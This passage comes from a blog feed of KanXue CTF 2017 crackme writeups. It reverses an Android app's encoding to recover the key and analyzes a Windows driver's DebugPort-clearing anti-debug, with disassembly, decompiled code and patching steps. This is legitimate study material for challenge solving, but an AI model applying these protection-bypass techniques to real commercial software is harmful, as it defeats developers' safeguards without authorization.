class="line">    &#123;</div><div class="line">      if ( i &gt;= _R10 )</div><div class="line">      &#123;</div><div class="line">        v16 = 0;</div><div class="line">        v15 = 0;</div><div class="line">      &#125;</div><div class="line">      else</div><div class="line">      &#123;</div><div class="line">        ii = 0;</div><div class="line">        v15 = 0;</div><div class="line">        do</div><div class="line">        &#123;</div><div class="line">          v15 = *(_BYTE *)(key + i + ii) | (v15 &lt;&lt; 8);// </div><div class="line">                                                // v15 = key[i] | 0&lt;&lt;8</div><div class="line">                                                // v15 = key[i+1] | v15&lt;&lt;8</div><div class="line">      // v15 = key[i+1] | v15&lt;&lt;8</div><div class="line">          v16 = ii + 1;</div><div class="line">          if ( ii + 1 &gt; 2 )                     // 0, 1</div><div class="line">            break;</div><div class="line">          v17 = i + ii++;</div><div class="line">        &#125;</div><div class="line">        while ( v17 + 1 &lt; _R10 );</div><div class="line">        i += v16;                               // v16 = 1, 2, 3</div><div class="line">                                                // i += v16, 下次计算使用的i</div><div class="line">      &#125;</div><div class="line">      j = 0;</div><div class="line">      v19 = v15 &lt;&lt; 8 * (3 - v16);</div><div class="line">      v20 = 0x12;</div><div class="line">      do</div><div class="line">      &#123;</div><div class="line">        if ( v16 &lt; j )</div><div class="line">          index = 0x40;</div><div class="line">        else</div><div class="line">          index = (v19 &gt;&gt; v20) &amp; 0x3F;</div><div class="line">        v20 -= 6;</div><div class="line">        *((_BYTE *)p1 + j++) = aAbcdefghijklmn[index];</div><div class="line">      &#125;</div><div class="line">      while ( j != 4 );                         // 每4字节</div><div class="line">      p1 = (char *)p1 + 4;</div><div class="line">    &#125;</div><div class="line">    while ( i &lt; _R10 );</div><div class="line">  &#125;</div></pre></td></tr></table></figure> <h1 id="逆向算法"><a href="#逆向算法" class="headerlink" title="逆向算法"></a>逆向算法</h1><p>算法大致明白了，结果又是JPyjup3eCyJjlkV6DmSmGHQ=（取了0x18字节）。那么将第二次加密进行求逆。<br>先找JPyjup3eCyJjlkV6DmSmGHQ=每字节在’ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=’中的index。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">k = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&apos;</div><div class="line">r = &apos;JPyjup3eCyJjlkV6DmSmGHQ=&apos; #//!!&apos;</div><div class="line">idd = []</div><div class="line">def get_index_in_k(c):</div><div class="line">    for i in range(0, len(k)):</div><div class="line">        c1 = k[i:i+1]</div><div class="line">        if c1 == c:</div><div class="line">            return i</div><div class="line">    return -1</div><div class="line">            </div><div class="line">def cc():</div><div class="line">    j = 0</div><div class="line">    for i in range(0, len(r)):</div><div class="line">        c1 = r[i: i+1]</div><div class="line">        index = get_index_in_k(c1)</div><div class="line">        idd.append(index) #保存序号</div><div class="line">        print &apos;%d: %c %d %x&apos; % (i+1, c1, index, index )</div></pre></td></tr></table></figure> <p>结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">1: J 9 9</div><div class="line">2: P 15 f</div><div class="line">3: y 50 32</div><div class="line">4: j 35 23</div><div class="line">5: u 46 2e</div><div class="line">6: p 41 29</div><div class="line">7: 3 55 37</div><div class="line">8: e 30 1e</div><div class="line">9: C 2 2</div><div class="line">10: y 50 32</div><div class="line">11: J 9 9</div><div class="line">12: j 35 23</div><div class="line">13: l 37 25</div><div class="line">14: k 36 24</div><div class="line">15: V 21 15</div><div class="line">16: 6 58 3a</div><div class="line">17: D 3 3</div><div class="line">18: m 38 26</div><div class="line">19: S 18 12</div><div class="line">20: m 38 26</div><div class="line">21: G 6 6</div><div class="line">22: H 7 7</div><div class="line">23: Q 16 10</div><div class="line">24: = 64 40</div></pre></td></tr></table></figure></p> <p>然后每4个index一组，来自于v19的4次右移，那么反过来4个一组，左移相加就是v19</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">for i in range(0, len(idd), 4):</div><div class="line">        a1 = idd[i] &lt;&lt; 0x12</div><div class="line">        a2 = idd[i+1] &lt;&lt; 0xc</div><div class="line">        a3 = idd[i+2] &lt;&lt; 0x6</div><div class="line">        a4 = 0</div><div class="line">        if idd[i+3] == 0x40:</div><div class="line">            a4 = 0</div><div class="line">        else:</div><div class="line">            a4 = idd[i+3] &lt;&lt; 0</div><div class="line">        a = a1+ a2+a3+a4</div><div class="line">        rrr.append(a)</div><div class="line">        print &apos;%d: %x&apos; % (i, a)</div></pre></td></tr></table></figure> <p>得到结果：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">0: 24fca3</div><div class="line">4: ba9dde</div><div class="line">8: b2263</div><div class="line">12: 96457a</div><div class="line">16: e64a6</div><div class="line">20: 1874</div></pre></td></tr></table></figure> <p>然后我们又知道v19其实是v15拼接的，所以拆开就得到v15（第一次加密结果），可以看到key长度应该是17。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">24 fc a3 ba 9d de 0b 22 63 96 45 7a 0e 64 a6 18 74</div></pre></td></tr></table></figure></p> <p>然后接着求第一次加密的逆运算，看代码，好多啊，怎么办，难道要求逆，好难！<br>好吧，不装了，其实不难，我们看前面说的第一次加密其实就是分组xor！<br>xor好啊，xor好啊…我们知道xor两次会将结果还原，想到了什么？！<br>是的，既然我们拿到第一次加密结果，那让他再和哪个8字节+0x100*4的数组再xor一次不久可以了，但是要重写这个加密代码貌似也挺麻烦的，怎么办？！</p> <p>这里我是这么做的，在调试中，第一次加密前，将key的值（本来是输入）修改为上面得到的第一次加密结果，然后开始第一次加密运算，这样不就完美的完成了一次求逆吗，哈哈！</p> <p>具体操作，对1A13A下断，输入key（必须是17位，否则修改内存时可能会挂），确认，断下来，此时r2就是key</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">5E127B20  31 32 33 34 35 36 37 38  39 30 31 32 33 34 35 36  1234567890123456</div><div class="line">5E127B30  37 00 6D 5F 1B 00 00 00  00 00 00 00 00 00 00 00  7.m_............</div></pre></td></tr></table></figure> <p>然后在hex窗口，f2修改内存，输入上面的24 fc…，然后f2确认修改。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">5E127B20  24 FC A3 BA 9D DE 0B 22  63 96 45 7A 0E 64 A6 18  $.</div><div class="line">5E127B30  74 A9 12 5E 0F 00 1F 00  FF FF 1F 00 0F 00 00 t..^..</div></pre></td></tr></table></figure></p> <p>然后f8。看看结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">5E127B38  6D 61 64 65 62 79 65 72  69 63 6B 79 39 34 35 32  madebyericky9452</div><div class="line">5E127B48  38 00 73 00 11 10 00 00  62 00 69 00 6C 00 69 00  8.s.....b.i.l.i.</div></pre></td></tr></table></figure></p> <p>答案就是：madebyericky94528</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/kxctf2017-writeup6">https://anhkgg.github.io/kxctf2017-writeup6</a></p> <p>参考：</p> <ol> <li><a href="http://bbs.pediy.com/thread-217612.htm" target="_blank" rel="external">安卓APP动态调试技术–以IDA为例</a></li> <li><a href="http://luleimi.blog.163.com/blog/static/175219645201210922139272/" target="_blank" rel="external">http://luleimi.blog.163.com/blog/static/175219645201210922139272/</a></li> <li><a href="http://blog.csdn.net/zhangmiaoping23/article/details/43445797" target="_blank" rel="external">http://blog.csdn.net/zhangmiaoping23/article/details/43445797</a></li> <li><a href="http://www.cnblogs.com/liujiahi/archive/2011/03/22/2196401.html" target="_blank" rel="external">http://www.cnblogs.com/liujiahi/archive/2011/03/22/2196401.html</a></li> <li><a href="http://cncc.bingj.com/cache.aspx?q=arm++IT+EQ&amp;d=4981012666125942&amp;mkt=zh-CN&amp;setlang=zh-CN&amp;w=YEX3ioizXLDZGmlpVDBGFh_dhhHpfnYj" target="_blank" rel="external">http://cncc.bingj.com/cache.aspx?q=arm++IT+EQ&amp;d=4981012666125942&amp;mkt=zh-CN&amp;setlang=zh-CN&amp;w=YEX3ioizXLDZGmlpVDBGFh_dhhHpfnYj</a></li> </ol> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;题目入口：&lt;a href=&quot;http://ctf.pediy.com/game-fight-36.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://ctf.pediy.com/game-fight-36.htm&lt;/a&gt;&lt;/p&gt; &lt;p&gt;本题是安卓cm，目测肯定需要调试so。&lt;/p&gt; &lt;p&gt;准备工具：&lt;/p&gt; &lt;ol&gt; &lt;li&gt;ApkIde改之理（其他类似的也行，能够反编译apk，得到jar,so等）&lt;/li&gt; &lt;li&gt;IDA（用于调试so），需要6.x以上，忘了是x几，我用的6.6&lt;/li&gt; &lt;li&gt;adb(ApkIde改之理就有)&lt;/li&gt; &lt;/ol&gt;          </summary>            <category term="ctf" scheme="https://anhkgg.github.io/categories/ctf/"/>                 <category term="ctf" scheme="https://anhkgg.github.io/tags/ctf/"/>            <category term="writeup" scheme="https://anhkgg.github.io/tags/writeup/"/>            <category term="看雪" scheme="https://anhkgg.github.io/tags/%E7%9C%8B%E9%9B%AA/"/>            <category term="kanxue" scheme="https://anhkgg.github.io/tags/kanxue/"/>            <category term="bbs.pediy.com" scheme="https://anhkgg.github.io/tags/bbs-pediy-com/"/>            <category term="crackme" scheme="https://anhkgg.github.io/tags/crackme/"/>            <category term="安卓" scheme="https://anhkgg.github.io/tags/%E5%AE%89%E5%8D%93/"/>            <category term="apk" scheme="https://anhkgg.github.io/tags/apk/"/>        </entry>      <entry>     <title>看雪CTF2017第五题 独行孤客CrackMe的writeup</title>     <link href="https://anhkgg.github.io/kxctf2017-writeup5/"/>     <id>https://anhkgg.github.io/kxctf2017-writeup5/</id>     <published>2017-06-11T06:42:16.000Z</published>     <updated>2017-06-17T00:18:16.200Z</updated>          <content type="html"><![CDATA[<p>题目入口：<a href="http://ctf.pediy.com/game-fight-35.htm" target="_blank" rel="external">http://ctf.pediy.com/game-fight-35.htm</a>，可下载相关文件</p> <blockquote> <p>本题需要在XP系统运行，因为驱动只支持xp</p> </blockquote> <h1 id="00-先看驱动"><a href="#00-先看驱动" class="headerlink" title="00. 先看驱动"></a>00. 先看驱动</h1><p>驱动不大，才20多个函数。</p> <p>从入口开始分析。</p> <h2 id="1-创建设备"><a href="#1-创建设备" class="headerlink" title="1. 创建设备"></a>1. 创建设备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.text:000107D5 68 58 13 01 00                                                  push    offset aDeviceVmxdrv ; &quot;\\device\\vmxdrv&quot;</div><div class="line">.text:000107DA 8D 45 F4                                                        lea     eax, [ebp+DestinationString]</div><div class="line">.text:000107DD 33 FF                                                           xor     edi, edi</div><div class="line">.text:000107DF 50                                                              push    eax             ; DestinationString</div><div class="line">.text:000107E0 89 7D FC                                                        mov     [ebp+DeviceObject], edi</div><div class="line">.text:000107E3 FF D6                                                           call    esi ; RtlInitUnicodeString</div></pre></td></tr></table></figure> <a id="more"></a> <p>用来与应用层通信</p> <h2 id="2-IRP-MJ-FUNCTION"><a href="#2-IRP-MJ-FUNCTION" class="headerlink" title="2. IRP_MJ_FUNCTION"></a>2. IRP_MJ_FUNCTION</h2><p>主要有三个，read/write/ioctl。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.text:00010870 C7 46 44 A8 05 01 00                                            mov     dword ptr [esi+44h], offset f_DrvRead_105A8</div><div class="line">.text:00010877 C7 46 48 1C 06 01 00                                            mov     dword ptr [esi+48h], offset f_DrvWrite_1061C</div><div class="line">.text:0001087E C7 46 70 1A 07 01 00                                            mov     dword ptr [esi+70h], offset f_DrvControl_1071A</div></pre></td></tr></table></figure> <p>先看f_DrvWrite_1061C，通过irp获取到上层传入的数据，然后通过104b6获取某个输出存入全局变量g_READCC（根据read的分析，可以知道长度为4的4字节数组）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">.text:00010669 57                                                              push    edi             ; size_t</div><div class="line">.text:0001066A FF 75 0C                                                        push    [ebp+Irp]       ; void *</div><div class="line">.text:0001066D 53                                                              push    ebx             ; void *</div><div class="line">.text:0001066E E8 11 0C 00 00                                                  call    memcpy</div><div class="line">.text:00010673 83 C4 18                                                        add     esp, 18h</div><div class="line">.text:00010676 83 3D D8 14 01 00 00                                            cmp     dword ptr is_clean_port, 0</div><div class="line">.text:0001067D 74 15                                                           jz      short loc_10694</div><div class="line">.text:0001067F 68 C8 14 01 00                                                  push    offset g_READCC ; int</div><div class="line">.text:00010684 53                                                              push    ebx             ; void *</div><div class="line">.text:00010685 E8 2C FE FF FF                                                  call    f_GetMd5_104B6</div><div class="line">.text:0001068A C7 05 DC 14 01 00 01 00 00 00                                   mov     is_write, 1</div></pre></td></tr></table></figure></p> <p>进入104b6内部，key是个16字节数组，初始化0。然后将上面传下的数据拷贝到key中，长度需要小于16。然后将key进行一下变换。<br>key[0] ++(反调试标志为1，后面再说)，其他key[i] += i<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">.text:000104F5 56                                                              push    esi             ; size_t //长度</div><div class="line">.text:000104F6 51                                                              push    ecx             ; void * //上层输入</div><div class="line">.text:000104F7 8D 45 EC                                                        lea     eax, [ebp+key]</div><div class="line">.text:000104FA 50                                                              push    eax             ; void *</div><div class="line">.text:000104FB E8 84 0D 00 00                                                  call    memcpy</div><div class="line">...</div><div class="line">text:00010505 39 05 D8 14 01 00                                               cmp     dword ptr is_clean_port, eax //判断标志是否为0，不为0，key[0] ++</div><div class="line">.text:0001050B 74 03                                                           jz      short loc_10510</div><div class="line">.text:0001050D FE 45 EC                                                        inc     [ebp+key]</div><div class="line">.text:00010510</div><div class="line">.text:00010510                                                 loc_10510:                              ; CODE XREF: f_GetMd5_104B6+55</div><div class="line">.text:00010510 3B F0                                                           cmp     esi, eax</div><div class="line">.text:00010512 7E 09                                                           jle     short loc_1051D</div><div class="line">.text:00010514</div><div class="line">.text:00010514                                                 loc_10514:                              ; CODE XREF: f_GetMd5_104B6+65</div><div class="line">.text:00010514 00 44 05 EC                                                     add     [ebp+eax+key], al //key[i] += i</div><div class="line">.text:00010518 40                                                              inc     eax</div><div class="line">.text:00010519 3B C6                                                           cmp     eax, esi</div><div class="line">.text:0001051B 7C F7                                                           jl      short loc_10514</div></pre></td></tr></table></figure></p> <p>接着通过下面三个函数对key进行计算，输出结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">f_Md5_Init_108B2((MD5OBJ *)&amp;v5);</div><div class="line">f_Md5_j_11124((MD5OBJ *)&amp;v5, key, strlen(key));</div><div class="line">f_Md5_hexdigest((int)&amp;v5, md5);</div></pre></td></tr></table></figure></p> <p>进入108b2一看就猜测是md5计算，f_Md5_hexdigest将计算结果(32字节字符)保存到md<br>5字段中输出，设置计算标志。也就是大致确认write是计算md5，然后保存到g_READCC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">MD5OBJ *__stdcall f_Md5_Init_108B2(MD5OBJ *a1)</div><div class="line">&#123;</div><div class="line">  MD5OBJ *result; // eax@1</div><div class="line">_DrvControl</div><div class="line">  result = a1;</div><div class="line">  a1-&gt;len8 = 0;</div><div class="line">  a1-&gt;unk_4 = 0;</div><div class="line">  a1-&gt;s1 = 0x67452301;</div><div class="line">  a1-&gt;s2 = 0xEFCDAB89;</div><div class="line">  a1-&gt;s3 = 0x98BADCFE;</div><div class="line">  a1-&gt;s4 = 0x10325476;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>接着看f_DrvRead_105A8，看刚才的计算标志是否为0，为0就初始化g_READCC一段值（不知道作者意图，迷惑cracker？），如果计算标志是1，就直接返回计算的结果，然后该值返回到用户空间。也就是如果通过write计算了md5，这里就是获取md5计算结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">.text:000105AD </div><div class="line"> if ( !is_write )</div><div class="line">  &#123;</div><div class="line">    i = 3;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      g_READCC[i] = 3 * i - &apos;d&apos;;</div><div class="line">      ++i;</div><div class="line">    &#125;</div><div class="line">    while ( i &lt; 16 );</div><div class="line">    g_READCC[0] = 0xCBu;</div><div class="line">    g_READCC[1] = 0xAAu;</div><div class="line">    g_READCC[2] = 0xDEu;</div><div class="line">    g_READCC[3] = 0xB0u;</div><div class="line">  &#125;</div><div class="line">  //返回数据</div><div class="line">   *(_DWORD *)&amp;MasterIrp-&gt;Type = *(_DWORD *)g_READCC;</div><div class="line">  v4 = (int)&amp;MasterIrp-&gt;MdlAddress;</div><div class="line">  *(_DWORD *)v4 = *(_DWORD *)&amp;g_READCC[4];</div><div class="line">  v4 += 4;</div><div class="line">  *(_DWORD *)v4 = *(_DWORD *)&amp;g_READCC[8];</div><div class="line">  *(_DWORD *)(v4 + 4) = *(_DWORD *)&amp;g_READCC[12];</div></pre></td></tr></table></figure></p> <p>最后看f_DrvControl_1071A，支持多个命令号，但只有222004h有用。设置反调试标志为1，然后进入10486看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.text:00010734 2D 04 20 22 00                                                  sub     eax, 222004h</div><div class="line">.text:00010739 8B 4E 0C                                                        mov     ecx, [esi+0Ch]</div><div class="line">.text:0001073C 74 2C                                                           jz      short loc_1076A</div><div class="line">...</div><div class="line">.text:0001076A                                                 loc_1076A:                              ; CODE XREF: f_DrvControl_1071A+22</div><div class="line">.text:0001076A C7 05 D8 14 01 00 01 00 00 00                                   mov     dword ptr is_clean_port, 1</div><div class="line">.text:00010774 FF 15 80 13 01 00                                               call    ds:IoGetCurrentProcess</div><div class="line">.text:0001077A A3 E0 14 01 00                                                  mov     eproc, eax</div><div class="line">.text:0001077F E8 02 FD FF FF                                                  call    f_ClearDebugPort_10486</div></pre></td></tr></table></figure></p> <p>枚举进程找到当前进程的eprocess(其实没必要枚举把)，置eprocess-&gt;DebugPort = NULL，让应用层调试器失效，达到反跳试效果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">result = IoGetCurrentProcess();</div><div class="line">  v1 = result;</div><div class="line">  while ( result != (PEPROCESS)eproc )</div><div class="line">  &#123;</div><div class="line">    result = (PEPROCESS)(*((_DWORD *)result + 0x22) - 0x88);// eproc-&gt;ActiveProcessLinks.Flink</div><div class="line">    if ( result == v1 )</div><div class="line">      return result;</div><div class="line">  &#125;</div><div class="line">  *((_DWORD *)result + 0x2F) = 0;               // eproc-&gt;DebugPort = 0</div></pre></td></tr></table></figure></p> <p>这里猜想一下，如果破解者通过应用层patch，不发送222004h命令来解除反跳试的话，那么这里的反跳试标志就是0，然后在write中计算md5时，对key[0]就不会做++操作，那么上层就会获取到一个错误的值，从而影响破解。</p> <h2 id="3-k掉驱动反调试"><a href="#3-k掉驱动反调试" class="headerlink" title="3. k掉驱动反调试"></a>3. k掉驱动反调试</h2><p>首先想到的是将驱动文件patch，也就是DebugPort置零的指令nop掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.text:000104A9 83 A0 BC 00 00 00 00                                            and     dword ptr [eax+0BCh], 0</div></pre></td></tr></table></figure></p> <p>通过reshacker将驱动资源导出来，然后hex编辑工具修改104A9的内容(文件内存对齐一样)为7个NOP，然后再将patch驱动文件导入到exe中。</p> <p>会提示驱动加载失败，可能有校验，不再细跟。</p> <p>没办法，为了让od能够调试，我写了个简单驱动，在本驱动加载时，将104A进行patch，通过反跳试。</p> <h1 id="01-再看CrackMe"><a href="#01-再看CrackMe" class="headerlink" title="01. 再看CrackMe"></a>01. 再看CrackMe</h1><p>既然知道有驱动了，先找找释放和加载驱动的代码，通过 FindResourceA和CreateService即可定位（不再详述），注意到的是，驱动加载成功会设置一个标志，用于后面验证的判断</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">v5 = f_CreaetSrv_401AA0(ServiceName, &amp;Buffer);// vmxdrv</div><div class="line"> v1-&gt;is_drv_run = v5;</div></pre></td></tr></table></figure> <p>然后再找和驱动通信的代码，通过DeviceIoControl找到调用222004命令好的代码。通过创建一个线程，循环调用该接口来清零DebugPort</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">while ( 1 )</div><div class="line"> &#123;</div><div class="line">   v0 = CreateFileA(FileName, 0xC0000000, 0, 0, 3u, 0x80u, 0);</div><div class="line">   if ( v0 == (HANDLE)-1 )</div><div class="line">     break;</div><div class="line">   DeviceIoControl(v0, 0x222004u, 0, 0, &amp;OutBuffer, 0x100u, &amp;BytesReturned, 0);</div><div class="line">   CloseHandle(v0);</div><div class="line">   Sleep(0xBB8u);</div><div class="line"> &#125;</div></pre></td></tr></table></figure> <p>按理说这里可以patch掉来去掉反跳试，但就会出现我前面分析提到的问题。</p> <p>通过WriteFile找到调用read/write的位置，也就是计算md5和获取md5的位置。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">.text:00401D50 ; HANDLE __thiscall f_CalcKeyMd5_401D50(void *this, char *key, size_t len)</div><div class="line">...</div><div class="line">.text:00401E4E                 push    ebx             ; lpOverlapped</div><div class="line">.text:00401E4F                 push    eax             ; lpNumberOfBytesWritten</div><div class="line">.text:00401E50                 lea     ecx, [esp+344h+Buffer] //用户输入的key相关数据</div><div class="line">.text:00401E54                 push    esi             ; nNumberOfBytesToWrite</div><div class="line">.text:00401E55                 push    ecx             ; lpBuffer</div><div class="line">.text:00401E56                 push    edi             ; hFile</div><div class="line">.text:00401E57                 call    ds:WriteFile //计算md5</div><div class="line">.text:00401E5D                 test    eax, eax</div><div class="line">.text:00401E5F                 jz      short loc_401ED4</div><div class="line">.text:00401E61                 lea     edx, [esp+33Ch+NumberOfBytesRead]</div><div class="line">.text:00401E65                 push    ebx             ; lpOverlapped</div><div class="line">.text:00401E66                 push    edx             ; lpNumberOfBytesRead</div><div class="line">.text:00401E67                 lea     eax, [esp+344h+keymd5]</div><div class="line">.text:00401E6E                 push    10h             ; nNumberOfBytesToRead</div><div class="line">.text:00401E70                 push    eax             ; lpBuffer</div><div class="line">.text:00401E71                 push    edi             ; hFile</div><div class="line">.text:00401E72                 call    ds:ReadFile //读取md5</div></pre></td></tr></table></figure> <p>f_CalcKeyMd5_401D50回溯一层就是输入key回车的响应函数。<br>这里先通过UpdateData(1)获取输入数据，然后拷贝到局部变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">f_UpdateData_41A4F7(1);</div><div class="line">f_CString_copy_417D43((CString *)&amp;key, (LPCSTR *)&amp;v1-&gt;key);//用户输入的</div></pre></td></tr></table></figure></p> <p>然后输入进行小写和反转变换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">f_CString_lwr_4182FA((CString *)&amp;key); //小写</div><div class="line">f_Cstring_rev_41830C((CString *)&amp;key);        // 反转</div></pre></td></tr></table></figure></p> <p>判断输入长度是否为6，不是退出，清除输入，并通过IsDebuggerPresent检查是否在调试（OD直接过），是调试也退出，清理出输入。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if ( *(_DWORD *)(key - 8) != 6 || IsDebuggerPresent() )</div><div class="line">&#123;</div><div class="line">  CString::operator=((CString *)&amp;v1-&gt;unk_6c, byte_431398);</div><div class="line">  CString::operator=((CString *)&amp;v1-&gt;key, byte_431398);</div><div class="line">  f_UpdateData_41A4F7(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>满足长度要求，再看驱动是否加载，再调用f_CalcKeyMd5_401D50计算md5. 也就是调用驱动获取md5，记为KeyMd51.</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//.text:004017DE</div><div class="line"> if ( v1-&gt;is_drv_run )</div><div class="line">    &#123;</div><div class="line">      keymd5str = *(_DWORD *)(key - 8);</div><div class="line">      v3 = sub_418263(&amp;key, 0);</div><div class="line">      f_CalcKeyMd5_401D50(v1, (char *)v3, keymd5str);</div><div class="line">    &#125;</div></pre></td></tr></table></figure> <p>接着下面两个函数，先调用f_GetStrMd5_401920（应用层的Md5，通过调试可以很快确认，内部也有md5特征）计算KeyMd51的Md5，记为KeyMd52，然后调用sub_415A78截取KeyMd52从第3为开始的10字符，记为KeyMd53。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">f_GetStrMd5_401920((char)v4, (CString *)keymd5str);// 00943950  37 63 37 36 36 65 32 61 31 63 61 30 35 37 63 37  7c766e2a1ca057c7</div><div class="line">                                            // 00943960  62 30 65 39 31 66 39 33 35 65 64 61 61 64 37 33  b0e91f935edaad73</div><div class="line">                                            // </div><div class="line">                                            // </div><div class="line">                                            // </div><div class="line">sub_415A78((LPCSTR *)&amp;keymd5str_obj, (int)&amp;v9, 2, 0xAu);// 截取2开始长度0xA的值</div><div class="line">                                            // 00943900  37 36 36 65 32 61 31 63 61 30 00 38 39 30 33 38  766e2a1ca0.89038</div><div class="line">                                            // 00943910  33 39 32 36 39 32 65 38 32 64 36 33 62 31 37 64  392692e82d63b17d</div><div class="line">                                            